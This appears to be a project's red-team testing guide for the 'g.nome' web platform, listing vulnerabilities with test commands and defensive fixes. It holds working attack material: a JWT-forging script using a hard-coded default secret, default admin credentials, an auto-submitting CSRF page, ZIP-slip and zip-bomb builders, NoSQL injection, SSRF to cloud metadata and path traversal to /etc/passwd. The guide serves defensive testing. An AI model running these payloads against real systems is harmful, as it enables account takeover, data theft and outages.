# Security Testing & Red Team Challenge

> ⚠️ **WARNING**: This document is for **security testing purposes only**. Do not use these techniques against systems you don't own or have explicit permission to test.

This document outlines security vulnerabilities and attack vectors that red teams and security researchers should test in the g.nome platform. Many of these are intentional "defaults" that should be changed in production.

## 🔴 Critical Security Concerns

### 1. Default Secret Keys

**Vulnerability**: Default JWT secret key and default admin credentials.

**Default Values**:
- `FLASK_SECRET_KEY`: `"a_very_insecure_default_dev_secret_123!"`
- `ADMIN_EMAIL`: `"admin@example.com"`
- `ADMIN_PASSWORD`: `"password123"`

**Attack Vector**:
1. If `FLASK_SECRET_KEY` is not changed, an attacker can:
   - Forge JWT tokens for any user
   - Create admin tokens
   - Bypass authentication entirely

2. If default admin credentials are not changed:
   - Login with `admin@example.com` / `password123`
   - Full admin access to platform
   - Upload malicious experiments
   - Access all user data

**Testing**:
```bash
# Test 1: Try default admin login
curl -X POST http://target/auth/login \
  -d "email=admin@example.com&password=password123"

# Test 2: Try to forge JWT with default secret
python3 <<EOF
import jwt
payload = {"user_id": "507f1f77bcf86cd799439011", "email": "admin@example.com", "is_admin": True, "exp": 9999999999}
token = jwt.encode(payload, "a_very_insecure_default_dev_secret_123!", algorithm="HS256")
print(token)
EOF

# Test 3: Use forged token
curl -H "Cookie: token=<FORGED_TOKEN>" http://target/admin/
```

**Fix**: Always change `FLASK_SECRET_KEY` and default admin password in production.

---

### 2. CSRF (Cross-Site Request Forgery)

**Vulnerability**: No CSRF token protection on state-changing endpoints.

**Attack Vector**:
1. Admin logs into platform
2. Attacker tricks admin into visiting malicious site
3. Malicious site makes POST request to admin endpoints
4. Browser sends admin's cookies automatically (same-origin)
5. Attacker performs actions as admin

**Vulnerable Endpoints**:
- `/admin/api/upload-experiment` (POST) - Upload malicious experiment
- `/auth/login` (POST) - Force login (less critical)
- `/auth/register` (POST) - Create accounts
- All admin endpoints that accept POST/PUT/DELETE

**Testing**:

**Test 1: CSRF Attack Simulation**
```html
<!-- malicious-site.com/csrf.html -->
<!DOCTYPE html>
<html>
<head><title>Free Money!</title></head>
<body>
  <h1>Click here for free money!</h1>
  <form id="csrf" action="http://target/admin/api/upload-experiment" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" id="file">
  </form>
  <script>
    // Auto-submit form when page loads (if admin is logged in)
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Test 2: JSON POST CSRF**
```javascript
// If API accepts JSON POST (check if vulnerable)
fetch('http://target/admin/api/some-endpoint', {
  method: 'POST',
  credentials: 'include', // Sends cookies
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({malicious: 'data'})
});
```

**Mitigation** (Not Implemented):
- Add CSRF tokens to all state-changing endpoints
- Use `SameSite=Strict` cookies (currently `lax`)
- Check `Origin`/`Referer` headers
- Implement double-submit cookie pattern

---

### 3. ZIP Slip / Path Traversal

**Vulnerability**: ZIP extraction may be vulnerable to path traversal if validation is bypassed.

**Attack Vector**:
1. Create malicious ZIP with path traversal:
   ```
   ../../../../etc/passwd
   ../../../../app/main.py
   ```
2. Upload ZIP via `/admin/api/upload-experiment`
3. If extraction doesn't properly validate paths, files write outside experiment directory

**Testing**:
```bash
# Create malicious ZIP
mkdir -p test-zip
cd test-zip
echo "MALICIOUS" > ../../../../tmp/evil.txt
zip -r ../evil.zip .
cd ..

# Try to upload
curl -X POST http://target/admin/api/upload-experiment \
  -H "Cookie: token=<ADMIN_TOKEN>" \
  -F "file=@evil.zip"

# Check if file was written outside experiment directory
ls -la /tmp/evil.txt  # Should not exist
```

**Current Protection**:
- Path validation checks for `..` in paths
- Security checks ensure target path is within experiment directory
- Absolute paths are rejected

**Test Edge Cases**:
- Unicode path traversal: `..%2F` or `..%252F`
- Windows path traversal: `..\..\..\`
- Mixed slashes: `../..\..`
- ZIP compression bombs (see below)

---

### 4. ZIP Compression Bombs

**Vulnerability**: Malicious ZIP files that expand to enormous sizes, exhausting disk/memory.

**Attack Vector**:
1. Create ZIP with small file size but huge expansion
2. Upload to `/admin/api/upload-experiment`
3. Extraction exhausts disk space or memory
4. Platform becomes unavailable

**Testing**:
```python
# Create compression bomb
import zipfile
import io

# Create a ZIP that expands to 1GB but is only a few KB
with zipfile.ZipFile('bomb.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    # Create a file that expands to 1GB when decompressed
    data = b'\x00' * 1024 * 1024 * 1024  # 1GB of zeros compresses well
    zf.writestr('huge.txt', data)

# Upload bomb
# curl -X POST http://target/admin/api/upload-experiment \
#   -H "Cookie: token=<ADMIN_TOKEN>" \
#   -F "file=@bomb.zip"
```

**Current Protection**:
- Max upload size: 100MB (configurable via `MAX_UPLOAD_SIZE_MB`)
- File size validation before extraction
- Memory streaming for large files

**Test Edge Cases**:
- Multiple small files that expand individually
- Nested ZIPs (ZIP inside ZIP)
- ZIP with many empty files (directory exhaustion)

---

### 5. Rate Limiting Bypass

**Vulnerability**: In-memory rate limiting can be bypassed via IP rotation.

**Attack Vector**:
1. Rate limiting is per-IP address
2. Attacker rotates IP addresses (proxy, VPN, botnet)
3. Each IP gets full rate limit quota
4. Distributed attack bypasses rate limits

**Testing**:
```bash
# Simulate distributed attack from multiple IPs
for i in {1..100}; do
  curl -X POST http://target/auth/login \
    -H "X-Forwarded-For: 192.168.1.$i" \
    -d "email=target@example.com&password=wrong" &
done

# Or use proxy rotation
curl -X POST http://target/auth/login \
  --proxy socks5://proxy1:1080 \
  -d "email=target@example.com&password=wrong"
curl -X POST http://target/auth/login \
  --proxy socks5://proxy2:1080 \
  -d "email=target@example.com&password=wrong"
```

**Current Protection**:
- IP-based rate limiting (5 login attempts/minute)
- Per-IP tracking in memory

**Limitations**:
- Doesn't work across multiple instances
- Can be bypassed via IP rotation
- No CAPTCHA on rate limit exceeded
- No progressive delays (exponential backoff)

---

### 6. JWT Token Security

**Vulnerability**: JWT tokens may be vulnerable to various attacks.

**Attack Vectors**:

**A. Algorithm Confusion**:
```python
# If server accepts multiple algorithms, attacker can use "none"
import jwt
token = jwt.encode({"user_id": "...", "is_admin": True}, "", algorithm="none")
```

**B. Weak Secret Key**:
- Default secret is weak and predictable
- Brute-force attacks on secret key
- Dictionary attacks

**C. Token Replay**:
- Tokens valid for 24 hours (long expiration)
- No token revocation mechanism
- Stolen tokens can be reused until expiration

**Testing**:
```python
# Test algorithm confusion
import jwt
token = jwt.encode({"user_id": "test", "is_admin": True}, "", algorithm="none")
# Try to use token - should fail if HS256-only enforced

# Test weak secret brute-force
# Use jwt-cracker or similar tool
# jwt-cracker <TOKEN>

# Test token expiration
# Get token, wait 25 hours, verify it's still valid (shouldn't be)
```

**Current Protection**:
- Single algorithm: `HS256` (hardcoded)
- HTTP-only cookies (prevents XSS theft)
- `SameSite=Lax` cookies (some CSRF protection)

**Vulnerabilities**:
- No token revocation mechanism
- Long expiration (24 hours)
- No refresh token rotation
- Cookie only (no Bearer token support)

---

### 7. Authorization Bypass

**Vulnerability**: Authorization checks may be bypassed if Casbin policies are misconfigured.

**Attack Vector**:
1. Check if authorization is properly enforced on all admin endpoints
2. Try to access admin endpoints without admin role
3. Test if anonymous users can access protected resources

**Testing**:
```bash
# Test 1: Access admin endpoint without auth
curl http://target/admin/

# Test 2: Access admin endpoint with non-admin user
curl -H "Cookie: token=<NON_ADMIN_TOKEN>" http://target/admin/api/upload-experiment

# Test 3: Test authorization on experiment routes
curl http://target/experiments/{slug}/admin-route

# Test 4: Check if policies are loaded correctly
# Inspect casbin_model.conf and casbin_policy.csv (if exists)
```

**Current Protection**:
- `require_admin` dependency on admin router
- Casbin RBAC policy enforcement
- Authorization cache (may hide policy misconfigurations)

**Test Edge Cases**:
- Policy file missing or malformed
- User with `is_admin=True` but no Casbin role
- Anonymous user accessing protected resources
- Role inheritance issues

---

### 8. MongoDB Injection

**Vulnerability**: MongoDB query injection if user input is not sanitized.

**Attack Vector**:
1. Find endpoints that accept user input for MongoDB queries
2. Inject MongoDB operators: `$ne`, `$gt`, `$regex`, etc.
3. Extract or modify data

**Testing**:
```bash
# Test 1: Login with MongoDB operators
curl -X POST http://target/auth/login \
  -d "email[$ne]=test&password[$ne]=test"

# Test 2: Search/filter parameters
curl "http://target/api/search?filter[$regex]=.*admin.*"

# Test 3: NoSQL injection in JSON body
curl -X POST http://target/api/query \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
```

**Current Protection**:
- Motor (async MongoDB driver) uses parameterized queries
- User input should be validated before database queries

**Risk Areas**:
- Custom query builders in experiments
- Filter/search endpoints with user input
- Admin panel query interfaces

---

### 9. Server-Side Request Forgery (SSRF)

**Vulnerability**: If platform makes HTTP requests based on user input, may be vulnerable to SSRF.

**Attack Vector**:
1. Find endpoints that accept URLs
2. Provide internal/private URLs:
   - `http://127.0.0.1/admin/api/upload-experiment`
   - `http://localhost:27017` (MongoDB)
   - `http://169.254.169.254/latest/meta-data/` (AWS metadata)
3. Platform makes request to internal resource
4. Attacker gains access to internal services

**Testing**:
```bash
# Test 1: SSRF via URL parameter
curl "http://target/api/proxy?url=http://127.0.0.1:27017"

# Test 2: SSRF via file upload (if URLs in manifest)
# Upload experiment with malicious URL in manifest.json

# Test 3: SSRF via B2/external storage URL
curl -X POST http://target/admin/api/upload-experiment \
  -F "file=@test.zip" \
  -F "storage_url=http://127.0.0.1:8080"
```

**Risk Areas**:
- B2 URL generation (if user-controlled)
- Experiment manifest URLs
- Export download URLs
- Webhook callbacks (if implemented)

---

### 10. Information Disclosure

**Vulnerability**: Error messages and logs may leak sensitive information.

**Attack Vector**:
1. Trigger errors intentionally
2. Check error messages for:
   - Database connection strings
   - File paths
   - Stack traces
   - Internal IPs/hostnames

**Testing**:
```bash
# Test 1: Invalid file upload
curl -X POST http://target/admin/api/upload-experiment \
  -H "Cookie: token=<ADMIN_TOKEN>" \
  -F "file=@/etc/passwd"

# Test 2: Invalid JSON
curl -X POST http://target/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"invalid": json}'

# Test 3: SQL/MongoDB error injection
curl "http://target/api/query?id=' OR 1=1 --"

# Test 4: Check for exposed endpoints
curl http://target/api/docs  # OpenAPI docs
curl http://target/api/redoc  # ReDoc docs
```

**Current Protection**:
- Production error handling (may hide stack traces)
- Logging may still contain sensitive info

**Risk Areas**:
- `/api/docs` (OpenAPI documentation)
- `/api/redoc` (ReDoc documentation)
- Error responses in development mode
- Log files (if accessible)

---

## 🟡 Medium Priority Security Concerns

### 11. Session Fixation

**Vulnerability**: No session invalidation on login (if using sessions).

**Attack Vector**:
1. Attacker creates session/token
2. Tricks user into using attacker's session
3. User logs in, attacker now has authenticated session

**Testing**:
```bash
# Get attacker's token
ATTACKER_TOKEN=$(curl -c cookies.txt -X POST http://target/auth/login \
  -d "email=attacker@example.com&password=attackerpass" | grep -o 'token=[^;]*')

# Try to use same token after victim logs in (if not invalidated)
curl -H "Cookie: token=$ATTACKER_TOKEN" http://target/admin/
```

**Current Behavior**:
- JWT tokens are created per login
- Old tokens not explicitly invalidated
- Token expiration (24 hours) prevents long-term reuse

---

### 12. Clickjacking / X-Frame-Options

**Vulnerability**: No `X-Frame-Options` header to prevent iframe embedding.

**Attack Vector**:
1. Attacker creates malicious page with iframe
2. Iframe loads admin panel
3. User interacts with iframe, attacker overlays malicious content
4. User clicks attacker's content thinking it's platform

**Testing**:
```html
<!-- attacker-site.com/clickjack.html -->
<iframe src="http://target/admin/" width="100%" height="100%"></iframe>
<div style="position:absolute;top:100px;left:100px;background:red;padding:20px;">
  Click here for free money!
</div>
```

**Mitigation** (Not Implemented):
- Add `X-Frame-Options: DENY` or `SAMEORIGIN` header
- Use Content Security Policy (CSP) `frame-ancestors` directive

---

### 13. CORS Misconfiguration

**Vulnerability**: If CORS is enabled, misconfiguration may allow unauthorized access.

**Attack Vector**:
1. Attacker's site makes cross-origin requests
2. If CORS allows arbitrary origins, attacker can:
   - Read admin data via authenticated requests
   - Perform actions as logged-in user

**Testing**:
```javascript
// From attacker-site.com
fetch('http://target/api/admin/data', {
  credentials: 'include', // Sends cookies
  headers: {'Origin': 'http://attacker-site.com'}
}).then(r => r.json()).then(data => console.log(data));
```

**Current Behavior**:
- FastAPI may not set CORS headers by default
- Check if CORS middleware is configured
- Verify CORS origin whitelist

---

### 14. Timing Attacks

**Vulnerability**: Timing differences in password comparison may leak information.

**Attack Vector**:
1. Measure response time for login attempts
2. Compare timing for existing vs. non-existing users
3. Use timing to enumerate valid user emails

**Testing**:
```python
import time
import requests

# Measure timing for existing user
start = time.time()
requests.post('http://target/auth/login', 
              data={'email': 'admin@example.com', 'password': 'wrong'})
existing_time = time.time() - start

# Measure timing for non-existing user
start = time.time()
requests.post('http://target/auth/login', 
              data={'email': 'nonexistent@example.com', 'password': 'wrong'})
non_existing_time = time.time() - start

# If times differ significantly, email enumeration possible
print(f"Existing: {existing_time}, Non-existing: {non_existing_time}")
```

**Current Protection**:
- bcrypt password comparison (constant-time)
- However, user lookup may have timing differences

---

### 15. HTTP Header Injection

**Vulnerability**: If user input is reflected in HTTP headers, may be vulnerable to header injection.

**Attack Vector**:
1. Find endpoints that set headers based on user input
2. Inject newline characters: `\r\n`
3. Inject malicious headers or split responses

**Testing**:
```bash
# Test 1: Header injection in redirect
curl "http://target/auth/login?next=http://evil.com\r\nX-Injected: true"

# Test 2: Header injection in filename
curl -X POST http://target/admin/api/upload-experiment \
  -F "file=@test.zip; filename=\"test.zip\r\nX-Injected: true\""
```

---

## 🟢 Lower Priority / Information Gathering

### 16. Version Disclosure

**Vulnerability**: Application version may be exposed in headers or responses.

**Testing**:
```bash
# Check headers
curl -I http://target/

# Check OpenAPI docs
curl http://target/api/openapi.json | jq .info.version

# Check HTML source
curl http://target/ | grep -i version
```

---

### 17. Directory Traversal in Static Files

**Vulnerability**: If static file serving doesn't validate paths, may allow directory traversal.

**Testing**:
```bash
# Test static file access
curl "http://target/static/../../../etc/passwd"
curl "http://target/experiments/{slug}/static/../../../../etc/passwd"
```

---

### 18. Verbose Error Messages

**Vulnerability**: Error messages may leak file paths, database structure, etc.

**Testing**:
```bash
# Trigger various errors
curl "http://target/nonexistent"
curl -X POST "http://target/invalid-endpoint" -d "invalid=data"
curl "http://target/api/query?id=<script>alert(1)</script>"
```

---

## 🛡️ Defense Recommendations

### Immediate Fixes

1. **Change Default Secrets**:
   ```bash
   export FLASK_SECRET_KEY=$(openssl rand -hex 32)
   export ADMIN_PASSWORD=$(openssl rand -hex 16)
   ```

2. **Enable CSRF Protection**:
   - Add CSRF tokens to all state-changing endpoints
   - Use `SameSite=Strict` cookies
   - Validate `Origin`/`Referer` headers

3. **Implement Rate Limiting**:
   - Move to Redis-based rate limiting
   - Add CAPTCHA after multiple failures
   - Implement progressive delays

4. **Add Security Headers**:
   ```python
   response.headers["X-Frame-Options"] = "DENY"
   response.headers["X-Content-Type-Options"] = "nosniff"
   response.headers["X-XSS-Protection"] = "1; mode=block"
   response.headers["Content-Security-Policy"] = "default-src 'self'"
   ```

### Long-Term Improvements

5. **Security Monitoring**:
   - Log all authentication attempts
   - Alert on suspicious patterns
   - Monitor for brute-force attacks

6. **Penetration Testing**:
   - Regular security audits
   - Automated vulnerability scanning
   - Code security reviews

7. **Input Validation**:
   - Validate all user input
   - Sanitize file uploads
   - Use parameterized queries

---

## 📋 Testing Checklist

- [ ] Test default admin credentials
- [ ] Test CSRF on all POST/PUT/DELETE endpoints
- [ ] Test ZIP Slip vulnerability
- [ ] Test rate limiting bypass (IP rotation)
- [ ] Test JWT token security (algorithm confusion, weak secret)
- [ ] Test authorization bypass
- [ ] Test MongoDB injection
- [ ] Test SSRF (if applicable)
- [ ] Test information disclosure (error messages)
- [ ] Test session fixation
- [ ] Test clickjacking protection
- [ ] Test CORS configuration
- [ ] Test timing attacks (email enumeration)
- [ ] Test HTTP header injection
- [ ] Check for version disclosure
- [ ] Test directory traversal in static files
- [ ] Review verbose error messages

---

## 🔍 Tools for Testing

- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Automated security scanner
- **Postman**: API testing and manipulation
- **curl**: Command-line HTTP requests
- **jwt-cracker**: JWT secret brute-forcing
- **sqlmap**: SQL injection testing (if applicable)
- **nikto**: Web server scanner

---

**Remember**: Only test systems you own or have explicit permission to test. Unauthorized testing is illegal.

